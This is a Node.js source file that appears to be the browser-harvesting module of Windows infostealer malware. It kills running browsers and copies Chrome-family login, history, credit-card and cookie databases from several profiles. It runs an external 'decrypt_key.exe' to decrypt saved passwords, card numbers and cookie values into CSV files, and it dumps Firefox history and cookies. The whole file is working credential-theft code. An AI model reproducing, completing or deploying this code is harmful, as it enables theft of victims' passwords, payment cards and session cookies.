const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
const { join, sep } = require('path');
const { randomFileCreator } = require('../util/dir');
const { execSync, exec } = require('child_process');
const { addDoubleQuotes } = require('../util/string');
const { sleep } = require('../util/general');
const { browsers, browsersProcesses } = require('../util/variables');
const fs = require('fs');
const csv = require('csv');
const { getTempFolder } = require('../util/init');
const sqlite3 = require('sqlite3').verbose();

const filesToDelete = [];
const toolPath = addDoubleQuotes(join(getTempFolder(), 'decrypt_key.exe'));

/**
 * @param {string} name
 * @param {string} path
 * @param {string} use
 * @param {string} filename
 * @param {(dbFile: string, csvFile: string) => void} dbData
 * @param {string} [profile]
 */
const _ = (name, path, use, filename, dbData, profile = 'Default') => {
  path += join(sep, profile, use);
  if (!existsSync(path)) return;

  if (!existsSync(join(getTempFolder(), 'Browsers', name))) mkdirSync(join(getTempFolder(), 'Browsers', name));
  const file = join(getTempFolder(), 'Browsers', name, `${filename}.csv`);
  const dbFile = randomFileCreator();
  filesToDelete.push(dbFile);
  copyFileSync(path, dbFile);

  dbData(dbFile, file);
};

const _ff = (path, profile, filename, use, columns, table) => {
  if (!existsSync(join(path, profile, 'key4.db'))) return;
  path = join(path, profile, `${use}.sqlite`);
  if (!existsSync(path)) return;

  const db = new sqlite3.Database(path);
  const file = join(getTempFolder(), 'Browsers', 'Mozilla Firefox', `${filename}.csv`);
  const csvFile = csv.stringify({
    columns: columns,
    header: true
  });

  db.serialize(() => {
    db.all(`SELECT ${columns.join(', ')} FROM ${table}`, (err, rows) => {
      if (err) return;
      for (const row in rows) csvFile.write(rows[row]);
    });
  });

  const pipe = csvFile.pipe(fs.createWriteStream(file)).on('finish', () => db.close());

  sleep(4000).then(() => {
    pipe.close();
  });
};

// TODO: find a way to decrypt Firefox passwords
const firefox = {
  passwords: () => {},
  history: (path, profile) => _ff(path, profile, 'History', 'places', ['url', 'title'], 'moz_places'),
  creditCards: () => {},
  cookies: (path, profile) => _ff(path, profile, 'Cookies', 'cookies', ['host', 'name', 'value'], 'moz_cookies')
};

const chrome = {
  passwords: (name, path, profile) => {
    return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => exec(
      [
        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
        `--csv-file "${csvFile}"`, '--rows "url,username,password"', '--decrypt-row 2'
      ].join(' ')
    ), profile);
  },
  history: (name, path, profile) => {
    return _(name, path, 'History', 'History', (dbFile, csvFile) => exec(
      [
        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title FROM urls"',
        `--csv-file "${csvFile}"`, '--rows "url,title"'
      ].join(' ')
    ), profile);
  },
  creditCards: (name, path, profile) => {
    return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => exec(
      [
        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
        '--sql "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"',
        `--csv-file "${csvFile}"`, '--rows "name on card,expiration month,expiration year,card number"', '--decrypt-row 3'
      ].join(' ')
    ), profile);
  },
  cookies: (name, path, profile) => {
    return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => exec(
      [
        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
        '--sql "SELECT host_key, name, encrypted_value FROM cookies"',
        `--csv-file "${csvFile}"`, '--rows "host,name,value"',
        '--decrypt-row 2'
      ].join(' ')
    ), profile);
  }
};

const kill = (processes) => {
  return new Promise((resolve) => {
    const tasks = execSync('tasklist').toString();
    processes = processes.filter(task => tasks.includes(task));
    processes.forEach((task) => exec(`taskkill /f /im ${task}.exe`));
    resolve();
  });
};

if (!existsSync(join(getTempFolder(), 'Browsers'))) mkdirSync(join(getTempFolder(), 'Browsers'));
kill(browsersProcesses).then(() => {
  Object.keys(browsers).forEach((browser) => {
    const path = browsers[browser];
    const isFirefox = browser === 'Firefox';
    if (isFirefox && !existsSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox')))
      mkdirSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox'));
    if (existsSync(path)) {
      ['passwords', 'history', 'creditCards', 'cookies'].forEach(fn => {
        (isFirefox ?
          fs.readdirSync(path) :
          ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
        ).forEach(profile => {
          isFirefox ?
            firefox[fn](path, profile) :
            chrome[fn](browser, path, profile);
        });
      });
    }
  });
});

process.on('exit', () => {
  sleep(1000).then(() => filesToDelete.forEach(file => existsSync(file) && rmSync(file)));
});
